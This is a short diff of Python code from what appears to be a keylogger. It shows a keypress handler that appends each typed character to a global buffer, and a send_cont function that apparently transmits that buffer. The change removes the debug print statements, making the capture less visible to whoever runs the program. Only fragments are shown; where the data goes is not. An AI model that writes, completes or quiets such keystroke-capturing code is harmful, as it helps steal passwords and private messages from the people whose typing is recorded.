@@ -11,7 +11,6 @@ def on_press(key):
     global ishook, cont
     #cont = ""
     if ishook == 1:
-        print("t: ", cont)
         try:
             cont += str(key.char)
         except AttributeError:
@@ -21,7 +20,6 @@ def on_press(key):
                 cont += '\n'
 
 def send_cont(cont):
-    print("con:", cont)
     if cont == "":
         cont = "no input key"
     
